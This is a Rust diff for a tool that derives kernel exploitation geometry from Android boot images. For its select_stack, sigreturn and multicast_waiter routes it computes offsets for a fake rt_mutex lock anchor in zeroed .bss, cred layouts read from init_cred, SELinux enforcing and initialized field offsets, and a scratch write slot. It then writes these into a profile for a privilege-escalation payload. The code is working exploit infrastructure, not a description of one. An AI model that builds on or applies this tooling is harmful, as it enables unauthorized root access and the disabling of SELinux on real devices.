+                        "warning: select_stack has no derived geometry; emitting the \
+                         family waiter_shift={} as a labelled heuristic",
+                        family::SELECT_WAITER_SHIFT
+                    );
+                    Some(family::SELECT_WAITER_SHIFT)
+                } else {
+                    None
+                }
+            })
+        } else {
+            pselect_shift
+        };
+        let sigreturn_offsets = route_verdicts
+            .iter()
+            .find(|verdict| {
+                verdict.route == "sigreturn"
+                    && verdict.verdict == analysis::Feasibility::Feasible
+            })
+            .and_then(|verdict| {
+                Some((
+                    *verdict.numbers.get("off_sve")?,
+                    *verdict.numbers.get("off_plain")?,
+                ))
+            });
+        if route.as_deref() == Some("sigreturn") && sigreturn_offsets.is_none() {
+            eprintln!(
+                "warning: sigreturn geometry has no image derivation; using the 5.10 \
+                 patch-range constants as a heuristic"
+            );
+        }
         let mut geometry = route
             .as_deref()
             .map(|route| {
-                report::conf_route_geometry(route, release_text, pselect_shift, &struct_offsets)
+                report::conf_route_geometry_with_sigreturn(
+                    route,
+                    release_text,
+                    route_shift,
+                    sigreturn_offsets,
+                    &struct_offsets,
+                )
             })
             .unwrap_or_default();
         // 5.x multicast: replace the proven-constant waiter_off with the value
         // statically derived from this image's setsockopt/futex stack frames.
         // No device or root is involved; the A301SO image reproduces its
-        // hardware-probed 0x60.
-        if route.as_deref() == Some("multicast_waiter") {
-            const MCAST_BUFFER_SIZE: u64 = 264;
-            const RT_MUTEX_WAITER_PI_TREE_ENTRY: u64 = 0x18;
-            match multicast_waiter_off(
-                &boot.kernel,
-                &rel_symbols,
-                &sorted_offsets,
-                MCAST_BUFFER_SIZE,
-                RT_MUTEX_WAITER_PI_TREE_ENTRY,
-            ) {
-                Ok(geom) => {
-                    eprintln!(
-                        "info: multicast waiter_off derived = 0x{:x} \
-                         (setsockopt depth 0x{:x} - futex depth 0x{:x})",
-                        geom.waiter_off, geom.setsockopt_depth, geom.waiter_depth
-                    );
-                    for entry in geometry.iter_mut() {
-                        if entry.0 == "waiter_off" {
-                            entry.1 = geom.waiter_off as i64;
+        // hardware-probed 0x60. The copy-window rule inside the derivation is
+        // the same one the verdict applied.
+        if route.as_deref() == Some("multicast_waiter") && !cli.no_disasm {
+            let layout = if release_major == Some(5) {
+                match btf.as_ref() {
+                    Some(btf) => WaiterLayout::from_btf(btf).ok(),
+                    None => Some(family::waiter_layout_5_10()),
+                }
+            } else {
+                btf.as_ref().and_then(|btf| WaiterLayout::from_btf(btf).ok())
+            };
+            match layout.and_then(|layout| layout.lock.map(|lock| (layout, lock))) {
+                Some((layout, lock)) => match multicast_waiter_off(
+                    &boot.kernel,
+                    &rel_symbols,
+                    &sorted_offsets,
+                    MULTICAST_5X_BUFFER_SIZE as u64,
+                    layout.pi_tree_entry,
+                    lock,
+                ) {
+                    Ok(geom) => {
+                        eprintln!(
+                            "info: multicast waiter_off derived = 0x{:x} \
+                             (setsockopt depth 0x{:x} - futex depth 0x{:x})",
+                            geom.waiter_off, geom.setsockopt_depth, geom.waiter_depth
+                        );
+                        for entry in geometry.iter_mut() {
+                            if entry.0 == "waiter_off" {
+                                entry.1 = geom.waiter_off as i64;
+                            }
                         }
                     }
-                }
-                Err(err) => eprintln!(
-                    "warning: static multicast waiter_off derivation failed: {err}; \
-                     keeping the proven 5.x constant"
+                    Err(err) => eprintln!(
+                        "warning: static multicast waiter_off derivation failed: {err}; \
+                         keeping the proven 5.x constant as a heuristic"
+                    ),
+                },
+                None => eprintln!(
+                    "warning: multicast waiter layout unavailable; keeping the proven 5.x \
+                     constant as a heuristic"
                 ),
             }
+        } else if route.as_deref() == Some("multicast_waiter") {
+            eprintln!(
+                "warning: --no-disasm; keeping the proven 5.x multicast constants as a \
+                 heuristic"
+            );
         }
         // On-device derivation: the fake rt_mutex lives in a zeroed .bss
         // region; the anchor triple is per image (offset, safe length, slot
         // pitch). The pitch is the family's sizeof(rt_mutex): the anchor scan
         // does not derive it (docs/analysis/anchor-derivation-plan.md).
-        if cli.anchor && family::matches(release_text) {
-            match route.as_deref() {
-                Some(route) if route == "select_stack" || route == "sigreturn" => {
-                    match anchor::best_candidate(
-                        &boot.kernel,
-                        &rel_symbols,
-                        Some("dump_skip.zeroes"),
-                    ) {
-                        Some(a) => {
-                            eprintln!(
-                                "info: lock anchor {} +0x{:x}, 0x{:x} bytes, stride {}, verdict {}",
-                                a.candidate.name,
-                                a.candidate.offset,
-                                a.safe_len,
-                                family::ANCHOR_STRIDE,
-                                a.verdict.label(),
-                            );
-                            geometry.push(("lock_anchor_image", a.candidate.offset as i64));
-                            geometry.push(("lock_anchor_bytes", a.safe_len as i64));
-                            geometry.push(("lock_anchor_stride", family::ANCHOR_STRIDE as i64));
-                        }
-                        None => eprintln!(
-                            "warning: --anchor found no usable .bss region; the profile falls \
-                             back to the reclaimed page"
-                        ),
+        let mut policy_scratch: Option<anchor::W1Scratch> = None;
+        if cli.anchor {
+            match (cli.anchor_image, cli.anchor_bytes, cli.anchor_stride) {
+                (Some(image), Some(bytes), Some(stride)) => {
+                    if stride == 0 || bytes < stride {
+                        eprintln!(
+                            "warning: lock anchor +0x{image:x}: 0x{bytes:x} bytes cannot \
+                             hold one {stride}-byte slot; the triple is omitted"
+                        );
+                    } else {
+                        eprintln!(
+                            "warning: operator-supplied lock anchor +0x{image:x}, \
+                             0x{bytes:x} bytes, stride {stride} -- NOT derived; the \
+                             anchor gate for {release_text} stays closed until a device \
+                             gate records a pass"
+                        );
+                        geometry.push(("lock_anchor_image", image as i64));
+                        geometry.push(("lock_anchor_bytes", bytes as i64));
+                        geometry.push(("lock_anchor_stride", stride as i64));
                     }
                 }
-                Some(route) => eprintln!(
-                    "warning: --anchor: route {route} does not use a lock anchor; nothing emitted"
+                (None, None, None) => {
+                    match route.as_deref() {
+                        Some(route)
+                            if route == "select_stack"
+                                || route == "sigreturn"
+                                || route == "multicast_waiter" =>
+                        {
+                            /* The policy chain (options::auto_plan): the
+                             * first unconditioned region with a slot, then an
+                             * unconditioned second region. The superset and
+                             * the CLI must not disagree. */
+                            let initialized = selinux_layout(btf.as_ref(), release_text)
+                                .map(|(_, initialized, _)| initialized);
+                            let candidates = options::scan_candidates(&options::CandidateInput {
+                                kernel: &boot.kernel,
+                                rel_symbols: &rel_symbols,
+                                phys_load: kernel_phys_load,
+                                phys_offset: kernel_phys_offset,
+                                initialized,
+                            });
+                            let plan = options::auto_plan(route, &candidates);
+                            match plan.anchor {
+                                Some(anchor) => {
+                                    let name = candidates
+                                        .iter()
+                                        .find(|candidate| {
+                                            candidate.anchor.as_ref().map(|a| a.image)
+                                                == Some(anchor.image)
+                                        })
+                                        .map(|candidate| {
+                                            format!(
+                                                "{} ({}{})",
+                                                candidate.name,
+                                                candidate.verdict,
+                                                if candidate.conditioned {
+                                                    ", conditioned"
+                                                } else {
+                                                    ""
+                                                }
+                                            )
+                                        })
+                                        .unwrap_or_else(|| "region".to_string());
+                                    eprintln!(
+                                        "info: auto plan anchor {name} +0x{:x}, 0x{:x} bytes, \
+                                         stride {}, page_free={} ({})",
+                                        anchor.image,
+                                        anchor.bytes,
+                                        anchor.stride,
+                                        plan.page_free,
+                                        plan.reason
+                                    );
+                                    geometry.push(("lock_anchor_image", anchor.image as i64));
+                                    geometry.push(("lock_anchor_bytes", anchor.bytes as i64));
+                                    geometry.push(("lock_anchor_stride", anchor.stride as i64));
+                                    policy_scratch =
+                                        plan.scratch.as_ref().map(|placement| anchor::W1Scratch {
+                                            image: placement.image,
+                                            window: placement.window,
+                                            reserved_first: placement.reserved_first.unwrap_or(0),
+                                            reserved_last: placement.reserved_last.unwrap_or(0),
+                                            inside_anchor: placement.reserved_first.is_some(),
+                                            source: anchor::ScratchSource::Policy,
+                                        });
+                                    if let Some(scratch) = policy_scratch {
+                                        eprintln!(
+                                            "info: auto plan scratch +0x{:x} ({}; {})",
+                                            scratch.image,
+                                            if scratch.inside_anchor {
+                                                "in-anchor"
+                                            } else {
+                                                "second region"
+                                            },
+                                            if scratch.inside_anchor {
+                                                format!(
+                                                    "reserves anchor slots {}..{}",
+                                                    scratch.reserved_first, scratch.reserved_last
+                                                )
+                                            } else {
+                                                "no slot reservation".to_string()
+                                            }
+                                        );
+                                    }
+                                }
+                                None => eprintln!(
+                                    "warning: --anchor found no unconditional anchor region; \
+                                     the profile falls back to the reclaimed page -- pass \
+                                     --anchor-image/--anchor-bytes/--anchor-stride for a known \
+                                     region"
+                                ),
+                            }
+                        }
+                        Some(route) => eprintln!(
+                            "warning: --anchor: route {route} does not use a lock anchor; \
+                             nothing emitted"
+                        ),
+                        None => {
+                            eprintln!("warning: --anchor: no route selected; nothing emitted")
+                        }
+                    }
+                }
+                _ => eprintln!(
+                    "warning: --anchor-image/--anchor-bytes/--anchor-stride must be given \
+                     together; the anchor triple is omitted"
                 ),
-                None => eprintln!("warning: --anchor: no route selected; nothing emitted"),
             }
         }
         match route.as_deref() {
@@ -809,11 +1312,60 @@ fn run(cli: &Cli) -> Result<i32> {
             });
             match derived_cred {
                 Some(cred) => cred,
-                None if family::matches(release_text) => {
+                None if series_matched => {
                     let init_cred_off = symbol_offsets.get("off_init_cred").copied().flatten();
-                    match init_cred_off
-                        .and_then(|offset| family::cred_from_image(&boot.kernel, offset, base))
-                    {
+                    let derived = init_cred_off.and_then(|offset| {
+                        structs::derive_cred_layout_5_10(&boot.kernel, offset, base)
+                    });
+                    let cred = match derived {
+                        Some(cred) => {
+                            eprintln!(
+                                "info: no BTF; cred caps and refs derived from init_cred \
+                                 ({} refs, caps at {:#x})",
+                                cred.refs.len(),
+                                cred.caps_offset
+                            );
+                            field_sources.insert(
+                                "cred_layout.caps".to_string(),
+                                "derived:init_cred".to_string(),
+                            );
+                            field_sources.insert(
+                                "cred_layout.refs".to_string(),
+                                "derived:init_cred".to_string(),
+                            );
+                            Some(cred)
+                        }
+                        None => {
+                            let fallback = init_cred_off.and_then(|offset| {
+                                family::cred_from_image(&boot.kernel, offset, base)
+                            });
+                            if fallback.is_some() {
+                                eprintln!(
+                                    "warning: cred layout derivation failed; using the \
+                                     measured-series offsets ({})",
+                                    series.label()
+                                );
+                                field_sources.insert(
+                                    "cred_layout.caps".to_string(),
+                                    format!("family-constant:{}", series.label()),
+                                );
+                                field_sources.insert(
+                                    "cred_layout.refs".to_string(),
+                                    format!("family-constant:{}", series.label()),
+                                );
+                            }
+                            fallback
+                        }
+                    };
+                    field_sources.insert(
+                        "cred_layout.copy_size".to_string(),
+                        format!("template:{}", series.label()),
+                    );
+                    field_sources.insert(
+                        "cred_layout.usage".to_string(),
+                        "family-constant:5.10".to_string(),
+                    );
+                    match cred {
                         Some(cred) => {
                             let mut entries = report::conf_cred_5x(&cred, family::CRED_COPY_SIZE);
                             entries.push((
@@ -822,10 +1374,12 @@ fn run(cli: &Cli) -> Result<i32> {
                             ));
                             entries.push(("ref3_offset".to_string(), "0".to_string()));
                             entries.push(("ref3_image".to_string(), "0".to_string()));
-                            eprintln!(
-                                "info: no BTF; cred refs read from init_cred at the diting 5.10 \
-                                 family offsets"
-                            );
+                            if series.is_heuristic() {
+                                eprintln!(
+                                    "warning: cred copy size and usage are heuristic \
+                                     (patch-range series, no IKCONFIG)"
+                                );
+                            }
                             entries
                         }
                         None => {
@@ -848,23 +1402,248 @@ fn run(cli: &Cli) -> Result<i32> {
         } else {
             report::conf_cred_6x()
         };
+        for name in [
+            "cred_layout.caps",
+            "cred_layout.refs",
+            "cred_layout.copy_size",
+            "cred_layout.usage",
+        ] {
+            if let Some(source) = field_sources.get(name) {
+                eprintln!("info: field_source {name}={source}");
+            }
+        }
         let extra_offsets = report::ConfExtraOffsets {
             empty_zero_page: kallsyms::unique(&symbols, "empty_zero_page")
                 .and_then(|value| value.checked_sub(base)),
         };
-        report::render_conf(&report::ConfInputs {
+        let layouts = layout::derive(btf.as_ref(), release_text);
+        /* Page-free Stage 1: the selinux field offsets and, when the route's
+         * anchor triple was derived, the W1 scratch slot inside that region.
+         * The scratch arithmetic needs the physical pair the native will use
+         * (the profile's values, else the compiled defaults) and a 64 KiB
+         * delta, so an unknown load or a misaligned delta fails closed. */
+        let selinux_fields = selinux_layout(btf.as_ref(), release_text);
+        let w1_scratch = (|| {
+            if !cli.anchor {
+                if cli.w1_scratch_image.is_some() || cli.w1_scratch_symbol.is_some() {
+                    eprintln!(
+                        "warning: --w1-scratch-image/--w1-scratch-symbol require \
+                         --anchor (the effective page-free flag needs the route's \
+                         anchor); the W1 scratch block is omitted"
+                    );
+                }
+                return None;
+            }
+            let field = |name: &str| {
+                geometry
+                    .iter()
+                    .find(|(key, _)| *key == name)
+                    .map(|(_, value)| *value as u64)
+            };
+            let anchor_image = field("lock_anchor_image")?;
+            let anchor_bytes = field("lock_anchor_bytes")?;
+            let stride = field("lock_anchor_stride")?;
+            let initialized = selinux_fields?.1;
+            let load = kernel_phys_load?;
+            let offset = kernel_phys_offset.unwrap_or(0x8000_0000);
+            let delta = load.checked_sub(offset)?;
+            if delta & 0xffff != 0 {
+                eprintln!(
+                    "warning: physical delta 0x{delta:x} is not 64 KiB-aligned; the \
+                     W1 scratch block is omitted"
+                );
+                return None;
+            }
+            match (cli.w1_scratch_image, cli.w1_scratch_symbol.as_deref()) {
+                (Some(_), Some(_)) => {
+                    eprintln!(
+                        "warning: --w1-scratch-image and --w1-scratch-symbol are \
+                         mutually exclusive; the W1 scratch block is omitted"
+                    );
+                    None
+                }
+                (Some(image), None) => anchor::pick_w1_scratch_at(
+                    image,
+                    anchor_image,
+                    anchor_bytes,
+                    stride,
+                    delta,
+                    initialized,
+                ),
+                (None, Some(symbol)) => {
+                    let Some(offset) = rel_symbols
+                        .get(symbol)
+                        .and_then(|offsets| offsets.iter().next().copied())
+                    else {
+                        eprintln!(
+                            "warning: --w1-scratch-symbol {symbol}: not in kallsyms; \
+                             the W1 scratch block is omitted"
+                        );
+                        return None;
+                    };
+                    let Some(next) = sorted_offsets.iter().copied().find(|off| *off > offset)
+                    else {
+                        eprintln!(
+                            "warning: --w1-scratch-symbol {symbol}: no following symbol \
+                             bounds the region; the W1 scratch block is omitted"
+                        );
+                        return None;
+                    };
+                    let scratch = anchor::pick_w1_scratch_in_symbol(
+                        offset,
+                        next - offset,
+                        &boot.kernel,
+                        delta,
+                        initialized,
+                    );
+                    if scratch.is_none() {
+                        eprintln!(
+                            "warning: --w1-scratch-symbol {symbol}: no admissible window \
+                             in 0x{:x} bytes; the W1 scratch block is omitted",
+                            next - offset
+                        );
+                    }
+                    scratch
+                }
+                (None, None) => policy_scratch.or_else(|| {
+                    anchor::pick_w1_scratch(
+                        anchor_image,
+                        anchor_bytes,
+                        stride,
+                        delta,
+                        initialized,
+                    )
+                }),
+            }
+        })();
+        let stage1 = selinux_fields.map(|(enforcing, initialized, source)| report::Stage1Conf {
+            selinux_enforcing: enforcing,
+            selinux_initialized: initialized,
+            selinux_source: source,
+            w1_scratch,
+        });
+        let inputs = report::ConfInputs {
             release: release_text,
             phys: kernel_phys_load,
-            /* DRAM base: from /proc/iomem when the extractor ran on a rooted
-             * device, otherwise left for the profile author to fill. */
+            /* DRAM base: from the vendor_boot/dtbo DTB /memory node, or left
+             * null so the native's compiled default applies. */
             phys_offset: kernel_phys_offset,
+            phys_source,
             symbols: &symbol_offsets,
             structs: &struct_offsets,
             route: route.as_deref(),
             route_geometry: &geometry,
             cred: &cred,
             extra_offsets: &extra_offsets,
-        })
+            layouts: Some(&layouts),
+            stage1,
+        };
+        /* The option superset, written once the common profile facts exist so
+         * it can be cut into any plan. An ambiguous route set reaches this
+         * point and exits 7 below, after the document is on disk. */
+        if let Some(path) = &cli.options_out {
+            let mut all_geometry: BTreeMap<String, BTreeMap<String, i64>> = BTreeMap::new();
+            for verdict in &route_verdicts {
+                if verdict.verdict != analysis::Feasibility::Feasible {
+                    continue;
+                }
+                let shift = if verdict.route == "select_stack" {
+                    pselect_shift.or_else(|| {
+                        (release_major == Some(5)).then_some(family::SELECT_WAITER_SHIFT)
+                    })
+                } else {
+                    pselect_shift
+                };
+                let mut geometry: BTreeMap<String, i64> =
+                    report::conf_route_geometry_with_sigreturn(
+                        verdict.route,
+                        release_text,
+                        shift,
+                        sigreturn_offsets,
+                        &struct_offsets,
+                    )
+                    .into_iter()
+                    .map(|(key, value)| (key.to_string(), value))
+                    .collect();
+                if verdict.route == "multicast_waiter" && !cli.no_disasm {
+                    let layout = if release_major == Some(5) {
+                        match btf.as_ref() {
+                            Some(btf) => WaiterLayout::from_btf(btf).ok(),
+                            None => Some(family::waiter_layout_5_10()),
+                        }
+                    } else {
+                        btf.as_ref().and_then(|btf| WaiterLayout::from_btf(btf).ok())
+                    };
+                    if let Some((layout, lock)) =
+                        layout.and_then(|layout| layout.lock.map(|lock| (layout, lock)))
+                    {
+                        if let Ok(geom) = multicast_waiter_off(
+                            &boot.kernel,
+                            &rel_symbols,
+                            &sorted_offsets,
+                            MULTICAST_5X_BUFFER_SIZE as u64,
+                            layout.pi_tree_entry,
+                            lock,
+                        ) {
+                            geometry.insert("waiter_off".to_string(), geom.waiter_off as i64);
+                        }
+                    }
+                }
+                all_geometry.insert(verdict.route.to_string(), geometry);
+            }
+            let common_text = report::render_conf(&report::ConfInputs {
+                release: release_text,
+                phys: kernel_phys_load,
+                phys_offset: kernel_phys_offset,
+                phys_source,
+                symbols: &symbol_offsets,
+                structs: &struct_offsets,
+                route: None,
+                route_geometry: &[],
+                cred: &cred,
+                extra_offsets: &extra_offsets,
+                layouts: Some(&layouts),
+                stage1: stage1.map(|stage| report::Stage1Conf {
+                    w1_scratch: None,
+                    ..stage
+                }),
+            });
+            let initialized = selinux_fields.map(|(_, initialized, _)| initialized);
+            let input = options::Input {
+                release: release_text,
+                kernel_major: major,
+                phys_load: kernel_phys_load,
+                phys_offset: kernel_phys_offset,
+                phys_source,
+                verdicts: &route_verdicts,
+                geometry: &all_geometry,
+                initialized,
+                kernel: &boot.kernel,
+                rel_symbols: &rel_symbols,
+                common_profile: &common_text,
+            };
+            let superset = options::build(&input);
+            let text = serde_json::to_string_pretty(&superset)
+                .map_err(|err| ExtractError::new(format!("cannot serialize options: {err}")))?;
+            std::fs::write(path, text + "\n")
+                .map_err(|err| ExtractError::new(format!("{err}")))?;
+            eprintln!("info: options superset written to {}", path.display());
+        }
+        if ambiguous {
+            return Ok(7);
+        }
+        if cli.explain {
+            let provenance = fact::Provenance {
+                btf_present: btf.is_some(),
+                phys_source,
+                route_forced: cli.route.is_some(),
+                field_sources: &field_sources,
+                release: release_text,
+                layouts: &layouts,
+            };
+            eprint!("{}", fact::explain_conf(&inputs, &provenance).render());
+        }
+        report::render_conf(&inputs)
     } else {
         let report_value = report::build_report(
             release.as_deref(),
@@ -912,7 +1691,7 @@ fn main() {
             // 5 kallsyms recovery failure,
             // 6 primitive already fixed.
             let code = match &err {
-                ExtractError::Infeasible(_) => 3,
+                ExtractError::Infeasible { .. } => 3,
                 ExtractError::Unsupported(_) => 4,
                 ExtractError::AlreadyFixed(_) => 6,
                 ExtractError::Kallsyms(_) => 5,
@@ -921,6 +1700,31 @@ fn main() {
             std::process::exit(code);
         }
     }
+}
+
+/// Render the `--feasible-out` JSON: the per-route verdicts the app's
+/// two-pass ambiguity flow reads, plus the route this pass chose (null when
+/// the routes are ambiguous or none is feasible).
+#[derive(serde::Serialize)]
+struct FeasibleOut<'a> {
+    release: &'a str,
+    routes: &'a [analysis::RouteVerdict],
+    chosen: Option<&'a str>,
+}
+
+fn write_feasible_out(
+    path: &Path,
+    release: &str,
+    verdicts: &[analysis::RouteVerdict],
+    chosen: Option<&str>,
+) -> Result<()> {
+    let text = serde_json::to_string_pretty(&FeasibleOut {
+        release,
+        routes: verdicts,
+        chosen,
+    })
+    .map_err(|err| ExtractError::new(format!("cannot serialize feasible-out: {err}")))?;
+    std::fs::write(path, text + "\n").map_err(|err| ExtractError::new(format!("{err}")))
 }
 
 /// Render the `--anchor-scan` report.
@@ -1004,11 +1808,18 @@ text [+0x{:x}, +0x{:x}), init [+0x{:x}, +0x{:x})\n",
             a.candidate.name, a.candidate.offset, a.candidate.extent
         ));
         out.push_str(&format!(
-            "  references : {} live read, {} live write, {} init\n",
+            "  references : {} live read, {} live write, {} init, {} materialized\n",
             a.live_reads.len(),
             a.live_writes.len(),
-            a.init_refs.len()
+            a.init_refs.len(),
+            a.materializations.len()
         ));
+        for r in a.materializations.iter().take(3) {
+            out.push_str(&format!(
+                "     addr  +0x{:x} at +0x{:x} (materialized; indexed/call uses are invisible)\n",
+                r.target, r.site
+            ));
+        }
         for r in a.live_reads.iter().take(3) {
             out.push_str(&format!(
                 "     read  +0x{:x} width {} at +0x{:x}\n",
@@ -1025,19 +1836,38 @@ text [+0x{:x}, +0x{:x}), init [+0x{:x}, +0x{:x})\n",
             "  safe length: 0x{:x}   (stopped by: {})\n",
             a.safe_len, a.stopped_by
         ));
+        out.push_str(&format!(
+            "  first access: {}\n",
+            a.first_access
+                .map(|o| format!("+0x{o:x}"))
+                .unwrap_or_else(|| "none".to_string())
+        ));
+        out.push_str(&format!(
+            "  clean prefix: 0x{:x}   (first read/write/init access, at stride {})\n",
+            anchor::clean_prefix(&a, family::ANCHOR_STRIDE),
+            family::ANCHOR_STRIDE,
+        ));
         out.push_str(&format!("  verdict    : {}\n", a.verdict.label()));
         out.push_str(&format!(
             "  stride     : not derived -- the PI walk's lock-relative accesses need \
 register provenance across branches; supply it in the profile (see the design doc)\n"
         ));
-        out.push_str(&format!(
-            "  => route.select_stack.lock_anchor_image  = {}\n",
-            a.candidate.offset
-        ));
-        out.push_str(&format!(
-            "     route.select_stack.lock_anchor_bytes  = {}\n\n",
-            a.safe_len
-        ));
+        match anchor::profile_triple(&a) {
+            Some((image, bytes, stride)) => {
+                out.push_str(&format!(
+                    "  => lock_anchor_image = {}   (place under the selected route)\n",
+                    image
+                ));
+                out.push_str(&format!(
+                    "     lock_anchor_bytes = {}   (safe prefix 0x{:x} rounded down)\n",
+                    bytes, a.safe_len
+                ));
+                out.push_str(&format!("     lock_anchor_stride = {}\n\n", stride));
+            }
+            None => out.push_str(
+                "  => no triple: the safe prefix is shorter than one lock slot\n\n",
+            ),
+        }
     }
     out
 }
